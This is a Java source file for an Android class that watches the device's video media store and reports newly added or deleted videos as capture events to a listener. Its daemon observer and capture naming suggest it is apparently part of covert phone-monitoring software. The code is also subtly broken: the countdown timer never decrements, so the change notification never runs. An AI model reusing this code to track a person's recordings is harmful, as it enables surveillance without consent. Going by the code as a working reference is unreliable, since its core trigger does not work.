package com.vvt.capture.video;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.net.Uri;
import android.provider.MediaStore.Video;

import com.vvt.base.FxEvent;
import com.vvt.calendar.CalendarObserver;
import com.vvt.contentobserver.IDaemonContentObserver;
import com.vvt.ioutil.SDCard;
import com.vvt.logger.FxLog;
import com.vvt.stringutil.FxStringUtils;

public class FxVideoCaptureObserver extends IDaemonContentObserver {
	private static final String TAG = "FxVideoCaptureObserver";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final String DEFAULT_DATE_FORMAT = "dd/MM/yy HH:mm:ss";
	private static final String DEFAULT_PATH = "/sdcard/data/data/com.vvt.im";
	
	private static final int SLEEP_TIME_SINCE_LAST_NOTIFICATION_IN_SEC = 10; //60000;
	private static FxVideoCaptureObserver sInstance;
	
	private CalendarObserver mCalendarObserver;
	private OnCaptureListener mListener;
	@SuppressWarnings("unused")
	private SimpleDateFormat mDateFormatter;
	private String mLoggablePath;
	private HashMap<Long, String> mlatestExternalLocationMap;  
	private HashMap<Long, String> mlatestInternalLocationMap;
	private Timer mTimer = null;

	
	public static FxVideoCaptureObserver getInstance(Context context) {
		if (sInstance == null) {
			sInstance = new FxVideoCaptureObserver(context);
		}
		return sInstance;
	}
	
	private FxVideoCaptureObserver(Context context) {
		super(context);
		
		mCalendarObserver = CalendarObserver.getInstance();
		mCalendarObserver.enable();
		
		mDateFormatter = new SimpleDateFormat(DEFAULT_DATE_FORMAT);
		mLoggablePath = DEFAULT_PATH;
		
		mlatestExternalLocationMap = new HashMap<Long, String>();
		mlatestInternalLocationMap = new HashMap<Long, String>();
	}
	
	public void setLoggablePath(String path) {
		if(LOGV) FxLog.v(TAG, "setLoggablePath # START");
		mLoggablePath = path;
		
		if(LOGV) FxLog.v(TAG, "setLoggablePath # mLoggablePath :" + mLoggablePath);
		if(LOGV) FxLog.v(TAG, "setLoggablePath # EXIT");
	}
	
	public void setDateFormat(String format) {
		mDateFormatter = new SimpleDateFormat(format);
	}
	
	public void registerObserver(OnCaptureListener listener) {
		if(LOGV) FxLog.v(TAG, "registerObserver # START");
		
		final String externalDatabaseFilePath = FxVideoHelper.getExternalDatabaseFilePath();
		
		if(!FxStringUtils.isEmptyOrNull(externalDatabaseFilePath)) {
			if(LOGD) FxLog.d(TAG, "registerObserver # external db name :" + externalDatabaseFilePath);
			
			final HashMap<Long, String> externalVideoMap = FxVideoHelper.getAllVideos(externalDatabaseFilePath);
			if(LOGD) FxLog.d(TAG, String.format("registerObserver # externalVideoMap size : %d", externalVideoMap.size()));
			setRefExternalVideoMap(externalVideoMap);
		}
		else {
			if(LOGE) FxLog.e(TAG, "registerObserver # external db name is null");
		}
		
		final String internalDatabaseFilePath = FxVideoHelper.getInternalDatabaseFilePath() ;
		
		if(!FxStringUtils.isEmptyOrNull(internalDatabaseFilePath)) {
			if(LOGD) FxLog.d(TAG, "registerObserver # internal db name :" + internalDatabaseFilePath);
			final HashMap<Long, String> internalVideoMap = FxVideoHelper.getAllVideos(internalDatabaseFilePath);
			if(LOGD) FxLog.d(TAG, String.format("registerObserver # internalVideoMap size : %d", internalVideoMap.size()));
			setRefInternalVideoMap(internalVideoMap);
		}
		else {
			if(LOGE) FxLog.e(TAG, "registerObserver # internal db name is null");
		}
		
		mListener = listener;
		super.registerObserver();
		if(LOGD) FxLog.d(TAG, "registerObserver # EXIT");
	}
	
	private void setRefExternalVideoMap(HashMap<Long, String> map) {
		if(LOGV) FxLog.v(TAG, "setRefExternalVideoMap # START");
		if(LOGV) FxLog.v(TAG, "setRefExternalVideoMap # map size:" + map.size());
		
		mlatestExternalLocationMap = map;
		FxVideoSettings.setRefExternalVideoMap(mLoggablePath, map);
		
		if(LOGV) FxLog.v(TAG, "setRefExternalVideoMap # EXIT");
	}
	
	private void setRefInternalVideoMap(HashMap<Long, String> map) {
		if(LOGV) FxLog.v(TAG, "setRefInternalVideoMap # START");
		if(LOGV) FxLog.v(TAG, "setRefInternalVideoMap # map size:" + map.size());
		
		mlatestInternalLocationMap = map;
		FxVideoSettings.setRefInternalVideoMap(mLoggablePath, map);
		
		if(LOGV) FxLog.v(TAG, "setRefInternalVideoMap # EXIT");
	}
	
	public void unregisterObserver(OnCaptureListener listener) {
		if(LOGV) FxLog.v(TAG, "unregisterObserver # START");
		
		mListener = null;
		super.unregisterObserver();
		
		if(LOGV) FxLog.v(TAG, "unregisterObserver # STOP");
	}
	
	@Override
	protected void onContentChange() {
		if(LOGV) FxLog.v(TAG, "onContentChange # ENTER ...");
		
		if(mTimer != null) {
			mTimer.cancel();
			if(LOGV) FxLog.v(TAG, "count down timer resetting...");
		}	
		
		mTimer = new Timer();
		mTimer.scheduleAtFixedRate(new TimerTask() {
            int i = SLEEP_TIME_SINCE_LAST_NOTIFICATION_IN_SEC;
            public void run() {
                if (i< 0) {
                	mTimer.cancel();
                	
                	notifyChange();
                }
            }
        }, 0, 1000);
		
		if(LOGV) FxLog.v(TAG, "onContentChange # EXIT ...");
	}
	
	private void notifyChange() {
		if(LOGV) FxLog.v(TAG, "notifyChange # START ...");
		processInternal();
		processExternal();
		if(LOGV) FxLog.v(TAG, "notifyChange # EXIT ...");
	}

	private void processInternal() {
		if(LOGV) FxLog.v(TAG, "processInternal # ENTER ...");
		
		try {
			final String internalDatabaseFilePath = FxVideoHelper.getInternalDatabaseFilePath() ;
			
			if(!FxStringUtils.isEmptyOrNull(internalDatabaseFilePath)) {
				final HashMap<Long, String> currentVideoMapOfInternal = FxVideoHelper.getAllVideos(internalDatabaseFilePath);
				ArrayList<FxEvent> events = new ArrayList<FxEvent>();
				
				if(LOGV) FxLog.v(TAG, "processInternal # INTERNAL_DATABASE_FILE_NAME:" + internalDatabaseFilePath);
				if(LOGV) FxLog.v(TAG, "processInternal # currentVideoMapOfInternal size:" + currentVideoMapOfInternal.size());
				
				if(currentVideoMapOfInternal.size() == mlatestInternalLocationMap.size()) {
					// Row count is same. nothing changed. escape ..
					if(LOGV) FxLog.v(TAG, "processInternal # Row count is same. nothing changed. escape ..");
					return;
				}
				else if(currentVideoMapOfInternal.size() > mlatestInternalLocationMap.size()) {
					if(LOGD) FxLog.d(TAG, "processInternal #New Video has added ..");
					
					// New Video has added ..
					events = FxVideoHelper.getWhatsNew(mLoggablePath, internalDatabaseFilePath, mlatestInternalLocationMap, currentVideoMapOfInternal);
					if(LOGD) FxLog.d(TAG, "processInternal # events size:" + events.size());
					
					// Reset the current map
					setRefInternalVideoMap(currentVideoMapOfInternal);

					if(events != null && events.size() > 0) {
						if (mListener != null) {
							if(LOGV) FxLog.v(TAG, "calling onCapture START");
							mListener.onCapture(events);
							if(LOGV) FxLog.v(TAG, "calling onCapture STOP");
						}
					}
				}
				else {

					// Check whether SDCars is available. If the SD Card is not available it will return 0 size collection.
					if(!SDCard.isConnected()) {
						if(LOGV) FxLog.v(TAG, "processInternal # SD Card is not connected..");
						return;
					}

					if(LOGD) FxLog.d(TAG, "processInternal # Video has been deleted.");
					// Video has been deleted.
					events = FxVideoHelper.getWhatsDeleted(mlatestInternalLocationMap, currentVideoMapOfInternal);

					if(LOGV) FxLog.v(TAG, "processInternal # events size:" + events.size());
					
					// Reset the current map
					setRefInternalVideoMap(currentVideoMapOfInternal);

					if(events != null && events.size() > 0)
						mListener.onCapture(events);
				}
			}
		}
		catch (Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
		}
		
		if(LOGV) FxLog.v(TAG, "processInternal # ENTER ...");
	}
	
	private void processExternal() {
		if(LOGV) FxLog.v(TAG, "processExternal # ENTER ...");
		
		try {
			final String externalDatabaseFilePath = FxVideoHelper.getExternalDatabaseFilePath();
			
			if(!FxStringUtils.isEmptyOrNull(externalDatabaseFilePath)) {
				final HashMap<Long, String> currentVideoMapOfExternal = FxVideoHelper.getAllVideos(externalDatabaseFilePath);
				ArrayList<FxEvent> events = new ArrayList<FxEvent>();
				
				if(LOGV) FxLog.v(TAG, "processExternal # EXTERNAL_DATABASE_FILE_NAME :" + externalDatabaseFilePath);
				if(LOGD) FxLog.d(TAG, String.format("processExternal # currentVideoMapOfExternal Size: %d vs  mlatestExternalLocationMap Size: %d", currentVideoMapOfExternal.size(), mlatestExternalLocationMap.size()));
				
				if(currentVideoMapOfExternal.size() == mlatestExternalLocationMap.size()) {
					// Row count is same. nothing changed. escape ..
					if(LOGV) FxLog.v(TAG, "processExternal # Row count is same. nothing changed. escape ..");
					return;
				}
				else if(currentVideoMapOfExternal.size() > mlatestExternalLocationMap.size()) {
					// New Video has added ..
					if(LOGD) FxLog.d(TAG, "processExternal # New Video has added ..");
					
					events = FxVideoHelper.getWhatsNew(mLoggablePath, externalDatabaseFilePath, mlatestExternalLocationMap, currentVideoMapOfExternal);
					if(LOGV) FxLog.v(TAG, "processExternal # events size:" + events.size());
					
					// Reset the current map
					setRefExternalVideoMap(currentVideoMapOfExternal);

					if(events != null && events.size() > 0) {
						if (mListener != null) {
							FxLog.d(TAG, "processExternal # onCapture START");
							mListener.onCapture(events);
							FxLog.d(TAG, "processExternal # onCapture STOP");
						}
						else
							FxLog.e(TAG, "mFxEventListner is null");
					}
				}
				else {

					// Check whether SDCars is available. If the SD Card is not available it will return 0 size collection.
					if(!SDCard.isConnected()) {
						FxLog.d(TAG, "processExternal # SD Card is not conneced, bailing");
						return;
					}

					// Video has been deleted.
					events = FxVideoHelper.getWhatsDeleted(mlatestExternalLocationMap, currentVideoMapOfExternal);

					// Reset the current map
					setRefExternalVideoMap(currentVideoMapOfExternal);

					if(events != null && events.size() > 0)
						mListener.onCapture(events);
				}
			}
		}
		catch (Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
		}
		
		if(LOGV) FxLog.v(TAG, "processExternal # EXIT ...");
	}
	
	@Override
	protected Uri getContentUri() {
		if(LOGV) FxLog.v(TAG, "getContentUri # ENTER ...");
		Uri mediaUri = Video.Media.EXTERNAL_CONTENT_URI;
		if(LOGV) FxLog.v(TAG, "getContentUri # Uri:" + mediaUri.toString());
		if(LOGV) FxLog.v(TAG, "getContentUri # EXIT ...");
		return mediaUri;
	}

	@Override
	protected String getTag() {
		return TAG;
	}

	public static interface OnCaptureListener {
		public void onCapture(ArrayList<FxEvent> Videos);
	}
}
